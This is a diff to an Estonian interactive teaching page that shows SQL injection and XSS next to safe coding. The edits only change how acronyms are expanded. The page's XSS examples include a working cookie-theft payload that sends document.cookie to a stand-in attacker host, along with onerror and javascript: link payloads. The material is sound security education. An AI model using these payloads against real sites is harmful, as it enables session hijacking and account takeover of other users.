@@ -43,7 +43,7 @@ kbd,.mono-in{font-family:var(--mono);font-size:.92em;background:var(--card);padd
 <h1>Veebirünnakud: proovi ise</h1>
 <nav><a href="https://github.com/valdonolvak/Operatsioonis-steemi-ja-k-berturbe-alused/blob/main/peatykid/24-kuberturbe-pohimoisted.md">← Peatükk 24</a><a href="#sqli">SQL-süst</a><a href="#xss">XSS</a></nav>
 <div class="intro">
-<p>SQL-süst (SQL – ingl <i>Structured Query Language</i>) ja XSS (ingl <i>Cross-Site Scripting</i>) on kaks levinumat veebirakenduste nõrkust. Mõlemal on sama põhjus: <strong>programm kleebib kasutaja sisendi teksti sisse, mida keegi teine tõlgendab koodina.</strong> SQL-süsti puhul on see tõlgendaja andmebaas, XSS-i puhul brauser.</p>
+<p>SQL-süst (SQL – <i>Structured Query Language</i>) ja XSS (<i>Cross-Site Scripting</i>) on kaks levinumat veebirakenduste nõrkust. Mõlemal on sama põhjus: <strong>programm kleebib kasutaja sisendi teksti sisse, mida keegi teine tõlgendab koodina.</strong> SQL-süsti puhul on see tõlgendaja andmebaas, XSS-i puhul brauser.</p>
 <p>Iga näite juures on kaks paneeli. Ülemine näitab ohtlikku koodi, mis sisendi lihtsalt kokku kleebib. Alumine näitab turvalist koodi, mis hoiab sisendi koodist eraldi. Vali näidisnupp või kirjuta väljale oma tekst. Mõlemad paneelid ja selgituskast uuenevad iga tähe järel.</p>
 <p>Värvid näitavad, mis sinu sisendist sai:</p>
 </div>
@@ -56,7 +56,7 @@ kbd,.mono-in{font-family:var(--mono);font-size:.92em;background:var(--card);padd
 <!-- ============ SQL INJECTION ============ -->
 <h2 id="sqli">1. SQL-süst</h2>
 <div class="intro">
-<p>Kujuta ette veebilehte, kus saab otsida kasutajat nime järgi. Nimi tuleb aadressiribalt, näiteks <span class="mono-in">otsi.php?nimi=mari</span>, ja PHP (ingl <i>PHP: Hypertext Preprocessor</i>) paneb selle andmebaasipäringusse.</p>
+<p>Kujuta ette veebilehte, kus saab otsida kasutajat nime järgi. Nimi tuleb aadressiribalt, näiteks <span class="mono-in">otsi.php?nimi=mari</span>, ja PHP (<i>PHP: Hypertext Preprocessor</i>) paneb selle andmebaasipäringusse.</p>
 <p>Ohtlik kood ehitab päringu kolmest tükist: programmeerija tekst kuni avava ülakomani, kasutaja sisend ja sulgev ülakoma. Andmebaas saab ühe valmis teksti ega tea, kus kasutaja osa algas ja lõppes. SQL-is tähistab ülakoma <span class="mono-in">'</span> stringi algust ja lõppu. Kui kasutaja kirjutab ülakoma, saab ta stringi ise sulgeda ja kõik järgnev on andmebaasi jaoks käsk.</p>
 <p><strong>Mida proovida:</strong> alusta nimest <span class="mono-in">mari</span>, siis lisa selle lõppu üks ülakoma ja vaata, kuidas värvid muutuvad.</p>
 </div>
@@ -86,10 +86,10 @@ $stmt->execute([$_GET['nimi']]);</div>
 <p class="why"><strong>Miks turvaline kood töötab?</strong> Päring jõuab andmebaasi kahes osas. <span class="mono-in">prepare()</span> saadab päringu kuju koos kohahoidjaga <span class="mono-in">?</span>, ja andmebaas parsib selle kohe valmis. <span class="mono-in">execute()</span> saadab väärtuse hiljem, eraldi paketis. Väärtus pannakse <span class="mono-in">?</span> kohale andmena ja seda ei parsita enam SQL-ina. Kasutaja ei saa seega päringu kuju muuta, olgu sisendis mis tahes märgid. Ülakomade „puhastamine“ (<span class="mono-in">addslashes()</span>) ei ole sama kindel: numbriväljas, näiteks <span class="mono-in">WHERE id = 1 OR 1=1</span>, pole ülakoma vajagi.</p>
 
 <!-- ============ XSS ============ -->
-<h2 id="xss">2. XSS (cross-site scripting)</h2>
+<h2 id="xss">2. XSS (<i>cross-site scripting</i>)</h2>
 <div class="intro">
 <p>Nüüd on tegemist kommentaaridega lehega. Kasutaja kirjutab kommentaari, see salvestatakse andmebaasi ja kõik järgmised külastajad näevad seda. Ohtlik kood paneb kommentaari muutmata kujul <span class="mono-in">&lt;p&gt;</span> sildi sisse.</p>
-<p>Viga on sama mis SQL-süstil, ainult tõlgendaja on teine. HTML-is (ingl <i>HyperText Markup Language</i>) tähistab märk <span class="mono-in">&lt;</span> sildi algust. Kui kommentaaris on <span class="mono-in">&lt;</span>, loeb brauser selle sildina. Kui sildis on JavaScript, käivitub see <strong>iga lugeja brauseris</strong> ja töötab lehe nimel: näeb küpsiseid, lehe sisu ja saab teha toiminguid kasutaja nimel.</p>
+<p>Viga on sama mis SQL-süstil, ainult tõlgendaja on teine. HTML-is (<i>HyperText Markup Language</i>) tähistab märk <span class="mono-in">&lt;</span> sildi algust. Kui kommentaaris on <span class="mono-in">&lt;</span>, loeb brauser selle sildina. Kui sildis on JavaScript, käivitub see <strong>iga lugeja brauseris</strong> ja töötab lehe nimel: näeb küpsiseid, lehe sisu ja saab teha toiminguid kasutaja nimel.</p>
 <p>Valgel taustal kast näitab, mida teine kasutaja ekraanil näeb. Selles näites on skriptid blokeeritud, nii et midagi päriselt ei käivitu. Selgituskast ütleb, mida päris leht oleks teinud.</p>
 </div>
 <p class="lbl">Kasutaja kommentaar ($_POST['kommentaar'])</p>
@@ -135,9 +135,9 @@ const SQL_EXPL={
 const XSS_EXPL={
  "Tore artikkel!":"<strong>Tavaline tekst.</strong> Märki <code>&lt;</code> pole, seega jääb kõik tekstiks ja ohtlik kood töötab õigesti.",
  "<b>väga</b> tore":"<strong>Sisend muudab lehe HTML-i.</strong> Brauser loeb <code>&lt;b&gt;</code> sildina ja kuvab sõna paksus kirjas. Kahju pole, aga see tõestab, et kommentaar saab lehe ülesehitust muuta. Kui saab lisada <code>&lt;b&gt;</code>, saab lisada ka <code>&lt;script&gt;</code>.",
- "<script>fetch('https://ryndaja.ee/?c='+document.cookie)<\/script>":"<strong>Seansiküpsise vargus.</strong> Iga lugeja brauser käivitab skripti, sest see on lehe enda HTML-is. <code>document.cookie</code> loeb lehe küpsised ja <code>fetch</code> saadab need ründaja serverisse. Seansiküpsisega pääseb ründaja ohvri kontosse ilma parooli ja MFA-ta, sest ohver on juba sisse loginud. Kui küpsisel on <code>HttpOnly</code> lipp, ei näe <code>document.cookie</code> seda.",
+ "<script>fetch('https://ryndaja.ee/?c='+document.cookie)<\/script>":"<strong>Seansiküpsise vargus.</strong> Iga lugeja brauser käivitab skripti, sest see on lehe enda HTML-is. <code>document.cookie</code> loeb lehe küpsised ja <code>fetch</code> saadab need ründaja serverisse. Seansiküpsisega pääseb ründaja ohvri kontosse ilma parooli ja MFA-ta (<i>Multi-Factor Authentication</i>), sest ohver on juba sisse loginud. Kui küpsisel on <code>HttpOnly</code> lipp, ei näe <code>document.cookie</code> seda.",
  "<img src=x onerror=alert(document.cookie)>":"<strong>Skript ilma sõnata „script“.</strong> Pilti <code>x</code> ei leita, brauser käivitab sündmuse <code>onerror</code> ja selles oleva JavaScripti. Seetõttu ei aita sõnade keelamine: HTML-is on kümneid sündmusi (<code>onload</code>, <code>onmouseover</code>, <code>onfocus</code> jt), mis käivitavad koodi.",
- "<a href=\"javascript:alert(1)\">Vajuta siia</a>":"<strong>Kood lingis.</strong> Aadress <code>javascript:</code> käivitab koodi, kui kasutaja lingile klõpsab. Siin aitab <code>htmlspecialchars()</code>, sest sisendis on <code>&lt;</code>. Kui aga programm paneb kasutaja antud URL-i ise <code>href</code> atribuuti, pole kodeerida midagi. Siis tuleb kontrollida, et aadress algab <code>https://</code>-ga."
+ "<a href=\"javascript:alert(1)\">Vajuta siia</a>":"<strong>Kood lingis.</strong> Aadress <code>javascript:</code> käivitab koodi, kui kasutaja lingile klõpsab. Siin aitab <code>htmlspecialchars()</code>, sest sisendis on <code>&lt;</code>. Kui aga programm paneb kasutaja antud URL-i (<i>Uniform Resource Locator</i>) ise <code>href</code> atribuuti, pole kodeerida midagi. Siis tuleb kontrollida, et aadress algab <code>https://</code>-ga."
 };
 function setExpl(id,html){document.getElementById(id).innerHTML=html}
 /* ---- SQL ---- */
